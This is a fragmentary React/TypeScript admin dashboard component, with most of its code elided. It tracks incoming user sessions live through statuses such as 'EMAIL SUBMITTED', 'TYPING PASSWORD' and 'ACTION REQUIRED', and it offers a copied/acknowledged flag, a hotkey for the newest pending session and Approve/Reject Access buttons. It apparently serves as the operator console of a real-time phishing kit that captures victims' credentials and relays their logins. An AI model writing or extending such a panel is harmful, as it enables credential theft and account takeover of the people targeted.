...
export default function AdminDashboardPage() {
    ...
    const handleKeyDown = (e: KeyboardEvent) => {
      ...
      if (e.code === 'Space') {
        ...
        if (now - lastSpacePressRef.current < 400) {
          ...
          // Find latest pending user first, or latest user overall
          const latestPending = currentUsers.find((u) => u.status !== 'approved' && u.status !== 'rejected');
          const targetUser = latestPending || currentUsers[0];
  ...
  // Filtered lists: Pending Action contains any active/unresolved sessions
  const pendingUsers = users.filter((u) => u.status !== 'approved' && u.status !== 'rejected');
  const approvedCount = users.filter((u) => u.status === 'approved').length;
  const activePopupUser = pendingUsers.find((u) => u.status === 'verifying' && !acknowledgedUsers.includes(u.id)) || null;

  let displayedUsers = activeTab === 'pending' ? pendingUsers : users;
      ...
      <aside className={`sidebar ${sidebarActive ? 'active' : ''}`}>
        ...
        <nav className="nav-menu">
          ...
          >
            ...
            <span>Pending Action ({pendingUsers.length})</span>
          </button>
          <button
          ...
          >
            ...
            <span>All Logs ({users.length})</span>
          </button>
        </nav>
        ...
        <div className="stats-grid">
          <div className="stat-card">
            <div className="stat-info">
              ...
              <div className="stat-value" style={{ color: pendingUsers.length > 0 ? 'var(--accent-danger)' : 'var(--text-primary)' }}>
                {pendingUsers.length}
              </div>
            </div>
        ...
        <div className="controls-card">
          <div className="tab-group">
            ...
            >
              ...
              <span className={`tab-badge ${pendingUsers.length > 0 ? 'warning' : ''}`}>
                {pendingUsers.length}
              </span>
            </button>
              ...
              <tbody>
                {displayedUsers.length === 0 ? (
                  <tr>
                    <td colSpan={7}>
                      <div className="empty-box">
                        <i className={activeTab === 'pending' ? 'ri-shield-check-line' : 'ri-inbox-archive-line'}></i>
                        <p>
                          {activeTab === 'pending'
                            ? 'No pending actions right now. Incoming user sessions will appear here in real time.'
                            : 'No user records found matching current filter.'}
                        </p>
                      </div>
                    </td>
                  </tr>
                  ...
                  displayedUsers.map((u) => {
                    const isVerifying = u.status === 'verifying';
                    const isUrgent = isVerifying && u.seconds_ago < 60 && !acknowledgedUsers.includes(u.id);
                    const isCopied = acknowledgedUsers.includes(u.id);
                    const isResolved = u.status === 'approved' || u.status === 'rejected';
                    const isReadOnly = activeTab === 'all' || isResolved;
                        ...
                        <td>
                          {u.status === 'verifying' && (
                            <span className="status-badge verifying">
                              <i className="ri-radar-line"></i> ACTION REQUIRED
                            </span>
                          )}
                          {u.status === 'typing_password' && (
                            <span className="status-badge typing">
                              <i className="ri-keyboard-line"></i> TYPING PASSWORD
                            </span>
                          )}
                          {u.status === 'email_entered' && (
                            <span className="status-badge email-entered">
                              <i className="ri-mail-line"></i> EMAIL SUBMITTED
                            </span>
                          )}
                          {u.status === 'approved' && (
                          ...
                          {isReadOnly ? (
                            ...
                            <div className="action-cell" style={{ justifyContent: 'center' }}>
                              <button
                                ...
                                title="Approve & Grant Access (Moves directly to All Logs)"
                              >
                              ...
                              <button
                                ...
                                title="Reject Access (Moves directly to All Logs)"
                              >
